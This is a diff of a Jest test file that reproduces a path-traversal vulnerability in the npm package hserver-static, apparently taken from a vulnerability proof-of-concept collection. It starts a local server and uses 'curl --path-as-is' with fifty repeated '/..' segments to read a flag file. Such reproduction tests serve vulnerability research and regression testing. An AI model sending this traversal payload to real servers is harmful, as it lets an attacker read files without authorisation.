@@ -1,12 +1,16 @@
-"use strict";
 //https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/hserver-static/test.js
+var execSync = require("child_process").execSync;
+afterAll(() => {
+  try {
+    execSync("fuser -k 8990/tcp");
+  } catch (e) {}
+});
+("use strict");
 const path = require("path");
 const pathToFlag = path.resolve(__dirname, "../flag.html");
-
 function genstr(n) {
   return "/..".repeat(50) + pathToFlag;
 }
-
 test("Path Traversal in hserver-static", (done) => {
   const Hserver = require("hserver");
   const Hstatic = require("hserver-static");
@@ -14,15 +18,11 @@ test("Path Traversal in hserver-static", (done) => {
   const { exec } = require("child_process");
   let hostsFile = fs.readFileSync(pathToFlag).toString();
   const a = require("child_process");
-
-  try{
-    a.execSync('fuser -k 8990/tcp',()=>{})//killing any other process using the same port
-  }catch(e){}
-
+  try {
+    a.execSync("fuser -k 8990/tcp", () => {});
+  } catch (e) {}
   const port = 8990;
   const app = new Hserver();
-
-  // logger
   app.use(function (next) {
     const start = new Date();
     this.res.once("finish", () => {
@@ -31,7 +31,6 @@ test("Path Traversal in hserver-static", (done) => {
     });
     next();
   });
-  // static middleware
   app.use(
     Hstatic({
       router: "/",
@@ -45,9 +44,7 @@ test("Path Traversal in hserver-static", (done) => {
   );
   app.listen(port);
   console.log(`Server is running at http://127.0.0.1:${port}/`);
-
   let attack_string = `curl -v --path-as-is "http://127.0.0.1:8990${genstr()}"`;
-
   exec(attack_string, (error, stdout) => {
     expect(stdout).toBe(hostsFile);
     done();
